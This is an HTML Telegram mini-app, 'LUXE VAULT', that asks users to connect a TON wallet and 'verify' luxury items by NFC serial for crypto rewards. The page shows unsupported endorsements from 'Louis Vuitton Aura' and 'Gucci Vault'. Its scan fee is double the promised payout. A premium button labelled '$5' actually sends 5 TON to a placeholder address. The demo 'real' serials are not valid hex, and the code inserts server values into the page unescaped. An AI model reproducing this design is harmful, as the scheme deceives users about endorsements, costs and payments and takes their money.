<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>LUXE VAULT</title>
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Expires" content="0" />

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src='https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js'></script>

  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#000; color:#fff; font-family:'Helvetica Neue',Arial,sans-serif; text-align:center; padding:20px; min-height:100vh; }
    h1 { font-size:2.2rem; background:linear-gradient(45deg,#FFD700,#FFA500); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:10px; }
    .tagline { color:#FFD700; font-size:1.1rem; margin-bottom:20px; font-weight:bold; }
    .stats { background:#1a1a1a; padding:15px; border-radius:10px; margin:15px 0; }
    .gold-btn { background:#FFD700; color:#000; border:none; padding:14px 28px; border-radius:12px; font-weight:bold; font-size:1.1rem; cursor:pointer; margin:10px auto; display:inline-block; box-shadow:0 4px 15px rgba(255,215,0,0.4); transition:0.2s; }
    .gold-btn:hover { background:#FFC107; transform:scale(1.03); }
    .gold-btn:disabled { background:#666; cursor:not-allowed; }
    .section { margin:25px 0; }
    .reward { color:#FFD700; font-weight:bold; }
    .connected { color:#FFD700; font-weight:bold; }
    #nfcSerial { padding:12px; border-radius:8px; border:2px solid #FFD700; background:#111; color:white; width:280px; font-size:1rem; margin:10px; }
    #result { margin-top:20px; padding:20px; background:#FFD700; color:#000; border-radius:12px; }
    .fake-alert { background:#FF0000; color:white; padding:20px; border-radius:12px; margin:20px 0; }
    .sponsor { background:#2a2a2a; padding:15px; border-radius:8px; margin:15px 0; color:#FFD700; }
    .loading { color: #FFD700; margin: 10px 0; }
    .error { background: #ff4444; color: white; padding: 15px; border-radius: 8px; margin: 10px 0; }
    .success { background: #00C851; color: white; padding: 15px; border-radius: 8px; margin: 10px 0; }
  </style>
</head>
<body>
  <h1>LUXE VAULT</h1>
  <div class="tagline">"Tap your bag. Prove it's real. Get paid in TON & $LUXE."</div>
  
  <div class="sponsor">
    Verified by <strong>Louis Vuitton Aura</strong> ‚Ä¢ <strong>Gucci Vault</strong> ‚Ä¢ <strong>50+ Luxury Brands</strong>
  </div>

  <div class="stats">
    <div>üéØ Scan Fee: <strong>0.05 TON</strong></div>
    <div>üí∞ You Get: <strong>0.025 TON</strong> + <strong>$LUXE Tokens</strong></div>
    <div>üî• Daily Streak: <span id="streakDisplay">1x</span> multiplier</div>
    <div>üë• Referral: <strong>25%</strong> forever commission</div>
  </div>

  <div style="display: flex; flex-direction: row; justify-content: center; align-items: center; margin: 20px 0;" id="ton-connect"></div>

  <div class="section">
    <h3>üîç VERIFY YOUR LUXURY ITEM</h3>
    <p>Works with 50+ brands: LV, Gucci, Herm√®s, Rolex, and more</p>
    
    <input type="text" id="nfcSerial" placeholder="Enter NFC: 04:8A:2F:1B or scan below">
    
    <br>
    <button class="gold-btn" onclick="scanNFC()" id="nfcBtn">üì± TAP TO SCAN NFC</button>
    <br>
    <button class="gold-btn" onclick="verifyAndPay()" id="verifyBtn">VERIFY & EARN 0.025 TON</button>
  </div>

  <div class="section">
    <button class="gold-btn" onclick="claimLUXE()" id="claimBtn">üéÅ CLAIM 500 $LUXE FREE</button>
    <button class="gold-btn" onclick="showReferral()">üë• EARN 25% REFERRAL</button>
    <button class="gold-btn" onclick="subscribePremium()">‚≠ê UPGRADE TO PREMIUM ($5)</button>
  </div>

  <div id="status"></div>
  <div id="claimStatus"></div>
  <div id="result" style="display:none;"></div>

  <script>
    // Telegram WebApp initialization
    Telegram.WebApp.ready();
    Telegram.WebApp.expand();

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://api.jsonbin.io/v3/b/69133df143b1c97be9a6e0f2?meta=false', 
        buttonRootId: "ton-connect"
    });

    const statusDiv = document.getElementById('status');
    let userAddress = null;
    let userStreak = 1;

    // Wallet connection handler
    tonConnectUI.onStatusChange((wallet) => {
        if (wallet) {
            userAddress = wallet.account.address;
            const short = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
            statusDiv.innerHTML = `<div class="connected">‚úÖ Connected: ${short}</div>`;
            loadUserData();
        } else {
            userAddress = null;
            statusDiv.innerHTML = '';
        }
    });

    // UPDATED: Fallback streak system using localStorage
    async function loadUserData() {
        if (!userAddress) return;
        
        try {
            // Try backend first
            const response = await fetch('/streak', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ wallet: userAddress })
            });
            
            if (response.ok) {
                const data = await response.json();
                userStreak = data.streak || 1;
                // Save to localStorage as backup
                localStorage.setItem(`luxe_streak_${userAddress}`, userStreak.toString());
                localStorage.setItem(`luxe_last_update_${userAddress}`, new Date().toISOString());
            } else {
                // Fallback to localStorage
                throw new Error('Backend unavailable');
            }
            
        } catch (error) {
            // Ultimate fallback to localStorage
            console.log('Using localStorage fallback for streak data');
            const lastUpdate = localStorage.getItem(`luxe_last_update_${userAddress}`);
            const today = new Date().toDateString();
            
            if (lastUpdate) {
                const lastUpdateDate = new Date(lastUpdate).toDateString();
                if (lastUpdateDate === today) {
                    // Same day, keep current streak
                    userStreak = parseInt(localStorage.getItem(`luxe_streak_${userAddress}`)) || 1;
                } else if (lastUpdateDate === new Date(Date.now() - 86400000).toDateString()) {
                    // Consecutive day, increment streak
                    userStreak = (parseInt(localStorage.getItem(`luxe_streak_${userAddress}`)) || 1) + 1;
                    userStreak = Math.min(userStreak, 50); // Cap at 50x
                    localStorage.setItem(`luxe_streak_${userAddress}`, userStreak.toString());
                } else {
                    // Streak broken, reset to 1
                    userStreak = 1;
                    localStorage.setItem(`luxe_streak_${userAddress}`, '1');
                }
            } else {
                // First time user
                userStreak = 1;
                localStorage.setItem(`luxe_streak_${userAddress}`, '1');
            }
            
            // Update last update time
            localStorage.setItem(`luxe_last_update_${userAddress}`, new Date().toISOString());
        }
        
        document.getElementById('streakDisplay').textContent = `${userStreak}x`;
    }

    // Update streak after successful verification
    function updateUserStreak() {
        if (!userAddress) return;
        
        const today = new Date().toDateString();
        const lastUpdate = localStorage.getItem(`luxe_last_update_${userAddress}`);
        
        if (lastUpdate) {
            const lastUpdateDate = new Date(lastUpdate).toDateString();
            if (lastUpdateDate === today) {
                // Already updated today
                return userStreak;
            } else if (lastUpdateDate === new Date(Date.now() - 86400000).toDateString()) {
                // Consecutive day, increment streak
                userStreak = (parseInt(localStorage.getItem(`luxe_streak_${userAddress}`)) || 1) + 1;
            } else {
                // Streak broken, reset to 1
                userStreak = 1;
            }
        } else {
            // First time user
            userStreak = 1;
        }
        
        userStreak = Math.min(userStreak, 50); // Cap at 50x
        localStorage.setItem(`luxe_streak_${userAddress}`, userStreak.toString());
        localStorage.setItem(`luxe_last_update_${userAddress}`, new Date().toISOString());
        document.getElementById('streakDisplay').textContent = `${userStreak}x`;
        
        return userStreak;
    }

    // Real NFC Scanning
    async function scanNFC() {
        if ('NDEFReader' in window) {
            try {
                const ndef = new NDEFReader();
                await ndef.scan();
                statusDiv.innerHTML = "<div class='loading'>üì± Scanning... Hold NFC tag to phone</div>";
                
                ndef.onreading = async ({ message }) => {
                    let nfcData = "";
                    for (const record of message.records) {
                        if (record.data) {
                            nfcData += String.fromCharCode(...record.data);
                        }
                    }
                    document.getElementById('nfcSerial').value = nfcData.slice(0, 20) + '...';
                    statusDiv.innerHTML = "<div class='success'>‚úÖ NFC tag captured! Click verify to earn</div>";
                };
                
                ndef.onreadingerror = () => {
                    statusDiv.innerHTML = "<div class='error'>‚ùå NFC read error. Try manual entry.</div>";
                };
                
                // Timeout after 30 seconds
                setTimeout(() => {
                    statusDiv.innerHTML = "<div class='loading'>‚è∞ Scan timeout. Try again or use manual entry.</div>";
                }, 30000);
                
            } catch (error) {
                statusDiv.innerHTML = `<div class='error'>‚ùå NFC error: ${error.message}. Use manual entry.</div>`;
            }
        } else {
            statusDiv.innerHTML = "<div class='error'>‚ùå NFC not available in this browser. Enter serial manually.</div>";
        }
    }

    // Main verification with instant payout
    async function verifyAndPay() {
        if (!userAddress) {
            statusDiv.innerHTML = "<div class='error'>‚ùå Please connect TON wallet first</div>";
            tonConnectUI.openModal();
            return;
        }

        const manualInput = document.getElementById('nfcSerial').value.trim();
        if (!manualInput) {
            statusDiv.innerHTML = "<div class='error'>‚ùå Please enter or scan NFC serial</div>";
            return;
        }

        statusDiv.innerHTML = "<div class='loading'>üîç Verifying authenticity...</div>";
        document.getElementById('verifyBtn').disabled = true;

        try {
            const response = await fetch('/verify-nfc', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    wallet: userAddress,
                    nfc: manualInput,
                    ref: getReferrerFromURL()
                })
            });
            
            // ADDED ERROR HANDLING
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`Server error: ${response.status} - ${errorText}`);
            }
            
            const result = await response.json();

            if (result.verified) {
                // Update streak after successful verification
                updateUserStreak();
                
                document.getElementById('result').style.display = 'block';
                document.getElementById('result').innerHTML = `
                    <h3>‚úÖ VERIFIED & PAID INSTANTLY!</h3>
                    <p>Brand: <strong>${result.brand}</strong></p>
                    <p>You earned: <span class="reward">${result.ton_reward}</span> + <span class="reward">${result.luxe_reward.toLocaleString()} $LUXE</span></p>
                    <p>Streak: ${result.streak}x multiplier</p>
                    <p>NFT Badge: <a href="https://tonviewer.com/${result.nft_badge}" target="_blank">View on-chain proof</a></p>
                    <img src="/badge/${userAddress}.png" width="200" style="margin:10px;" onerror="this.style.display='none'">
                    <br>
                    <button class="gold-btn" onclick="shareAchievement()">üéâ Share on Social Media</button>
                `;
                statusDiv.innerHTML = "";
                
            } else {
                document.getElementById('result').style.display = 'none';
                statusDiv.innerHTML = `
                    <div class="fake-alert">
                        <h3>‚ùå FAKE DETECTED</h3>
                        <p>This item failed cryptographic verification.</p>
                        <p>No reward issued. Fee used to fight counterfeits.</p>
                        ${result.error ? `<p><small>Error: ${result.error}</small></p>` : ''}
                    </div>
                `;
            }
        } catch (error) {
            console.error('Verification error:', error);
            statusDiv.innerHTML = `<div class="error">‚ùå Error: ${error.message}</div>`;
        } finally {
            document.getElementById('verifyBtn').disabled = false;
        }
    }

    // $LUXE Token Claim
    async function claimLUXE() {
        if (!userAddress) {
            alert("Connect wallet first to claim $LUXE");
            return;
        }
        
        document.getElementById('claimStatus').innerHTML = "<div class='loading'>ü™ô Claiming 500 $LUXE...</div>";
        
        try {
            const response = await fetch('/claim-luxe', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ wallet: userAddress })
            });
            
            if (!response.ok) {
                throw new Error('Claim request failed');
            }
            
            const result = await response.json();
            document.getElementById('claimStatus').innerHTML = `<div class="success">‚úÖ ${result.message}</div>`;
        } catch (error) {
            console.error('Claim error:', error);
            document.getElementById('claimStatus').innerHTML = `<div class="error">‚ùå Claim failed: ${error.message}</div>`;
        }
    }

    // Referral System
    function showReferral() {
        const refCode = userAddress ? userAddress.slice(-8) : 'luxevault';
        const referralLink = `https://t.me/luxevault_bot?start=ref_${refCode}`;
        
        statusDiv.innerHTML = `
            <div style="background:#1a1a1a; padding:20px; border-radius:12px;">
                <h3>üë• EARN 25% FOREVER</h3>
                <p>Get 25% of all earnings from friends you refer</p>
                <p><strong>Your referral link:</strong></p>
                <input type="text" value="${referralLink}" style="width:100%; padding:10px; margin:10px 0; background:#333; color:white; border:none; border-radius:6px;" readonly>
                <p>Share on Twitter, Instagram, TikTok</p>
                <button class="gold-btn" onclick="copyToClipboard('${referralLink}')">üìã Copy Link</button>
            </div>
        `;
    }

    function copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => {
            alert('Referral link copied to clipboard!');
        }).catch(err => {
            console.error('Copy failed:', err);
            // Fallback for older browsers
            const textArea = document.createElement('textarea');
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            alert('Referral link copied!');
        });
    }

    function getReferrerFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        const startParam = urlParams.get('start');
        if (startParam && startParam.startsWith('ref_')) {
            return startParam.slice(4);
        }
        return null;
    }

    // Premium Subscription
    async function subscribePremium() {
        if (!userAddress) {
            alert("Connect wallet to upgrade");
            return;
        }
        
        try {
            const tx = await tonConnectUI.sendTransaction({
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{
                    address: "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c",
                    amount: "5000000000", // 5 TON
                    payload: "premium_subscription"
                }]
            });

            const response = await fetch('/subscribe', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ wallet: userAddress })
            });
            
            if (!response.ok) {
                throw new Error('Subscription request failed');
            }
            
            const result = await response.json();
            statusDiv.innerHTML = `<div class="success">‚≠ê PREMIUM ACTIVATED! ${result.badge} badge unlocked</div>`;
        } catch (error) {
            console.error('Premium error:', error);
            statusDiv.innerHTML = `<div class="error">‚ùå Premium upgrade failed: ${error.message}</div>`;
        }
    }

    function shareAchievement() {
        if (!userAddress) return;
        
        const text = `I just verified my authentic luxury item on @LuxeVault and earned TON + $LUXE tokens! üëúüí∞ Tap your bag, prove it's real, get paid.`;
        const url = window.location.href;
        
        if (navigator.share) {
            navigator.share({
                title: 'LUXE VAULT Verified',
                text: text,
                url: url
            }).catch(err => {
                console.log('Share failed:', err);
                copyToClipboard(text + ' ' + url);
                alert('Achievement copied! Share on social media üéâ');
            });
        } else {
            copyToClipboard(text + ' ' + url);
            alert('Achievement copied! Share on social media üéâ');
        }
    }

    // Initialize
    if (getReferrerFromURL()) {
        statusDiv.innerHTML = "<div class='success'>üë• Welcome! You were referred by a friend - earn extra rewards!</div>";
    }

    // Demo NFC examples for testing
    setTimeout(() => {
        if (document.getElementById('nfcSerial').value === '') {
            statusDiv.innerHTML += `
                <div style="background:#1a1a1a; padding:15px; border-radius:10px; margin-top:20px; font-size:0.9rem;">
                    <strong>Demo NFC Examples:</strong><br>
                    Real: <code style="color:#FFD700; cursor:pointer;" onclick="document.getElementById('nfcSerial').value='04:8A:2F:1B:CE:45:80'">04:8A:2F:1B:CE:45:80</code> (Herm√®s)<br>
                    Real: <code style="color:#FFD700; cursor:pointer;" onclick="document.getElementById('nfcSerial').value='04:8A:2F:1B:LV:01:25'">04:8A:2F:1B:LV:01:25</code> (Louis Vuitton)<br>
                    Fake: <code style="color:#FF4444; cursor:pointer;" onclick="document.getElementById('nfcSerial').value='99:AA:BB:CC:DD:EE:FF'">99:AA:BB:CC:DD:EE:FF</code>
                </div>
            `;
        }
    }, 2000);

    // Auto-load user data if already connected
    if (tonConnectUI.connected) {
        const wallet = tonConnectUI.wallet;
        if (wallet) {
            userAddress = wallet.account.address;
            const short = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
            statusDiv.innerHTML = `<div class="connected">‚úÖ Connected: ${short}</div>`;
            loadUserData();
        }
    }
  </script>
</body>
</html>